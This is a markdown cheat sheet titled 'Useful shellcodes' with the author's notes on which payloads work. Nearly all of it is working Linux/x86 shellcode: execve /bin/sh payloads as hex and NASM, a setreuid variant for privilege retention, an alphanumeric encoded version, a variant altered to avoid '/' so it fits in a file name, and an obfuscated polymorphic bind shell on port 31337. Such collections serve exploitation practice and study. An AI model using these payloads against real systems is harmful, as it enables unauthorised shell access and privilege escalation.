# Useful shellcodes


## [_Hamza Megahed_'s Linux/x86 execve `/bin/sh` shellcode<sub>(23 bytes)</sub>](http://shell-storm.org/shellcode/files/shellcode-827.php)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```
Whenever I use this shellcode, **it's executed but the OS keeps executing the next instructions; without giving me the shell**.
So I recommend you use [hkpco's shellcode](http://hkpco.kr/paper/universal%20setreuid%20shellcode.txt) instead.


## [_hkpco_'s shellcode](http://hkpco.kr/paper/universal%20setreuid%20shellcode.txt) :star2:
```c
"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80"
// setreuid(geteuid(), geteuid());
```
-----
```c
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
// 25 bytes of shellcode
```
```nasm
; nasm
BITS 32
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	xor edx, edx
	mov al, 0xb
	int 0x80
```


## [Linux/x86 - execve `/bin/sh` alphanumeric shellcode<sub>(195 bytes)</sub>](https://www.exploit-db.com/exploits/13424/)
```
GGGGGGGGGGGGGGGGGLLLLXPY3E01E01u03u0fXh8eshXf5VJPfhbifhDefXf5AJfPDTYhKATYX5KATYPQTUX3H01H01X03X0YRX3E01E03U0Jfh2GfXf3E0f1E0f1U0fh88fX0E1f1E0f3E0fPTRX49HHHQfPfYRX2E00E0BRX0E02E02L0z0L0zYRX4j4aGGGG
```
Does not work. Maybe it needs some condition to be used?


## Modified _hkpco's shellcode_ without `0x2f`(`'/'`)<sub>(39 bytes)</sub> :star2:
I modified _hkpco's shellcode_ to avoid `0x2f`, in order to use it as a file name.
```
\x31\xc0\x50\x68\x61\x61\x73\x68\x68\x61\x62\x69\x6e\x80\x34\x24\x4e\x80\x74\x24\x04\x4e\x80\x74\x24\x05\x4e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```
```nasm
; nasm
BITS 32
	xor eax, eax
	push eax
	push 0x68736161
	push 0x6e696261
	xor BYTE [esp], 0x4E
	xor BYTE [esp+4], 0x4E
	xor BYTE [esp+5], 0x4E
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	xor edx, edx
	mov al, 0xb
	int 0x80
```


## [*gunslinger_*'s polymorphic shellcode for x86 Linux that binds to the port 31337 with `setreuid(0, 0)`<sub>(131 bytes)</sub>](http://shell-storm.org/shellcode/files/shellcode-655.php) :star2:
```c
"\xeb\x11\x5e\x31\xc9\xb1\x6b\x80\x6c\x0e\xff\x35\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xe5\x7b\xbd\x0e\x02\xb5\x66\xf5\x66\x10\x66\x07\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb\x87\x9d\xf0\x37\xaf\x9e\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe\x16\xe5\x40\x02\xb5"
```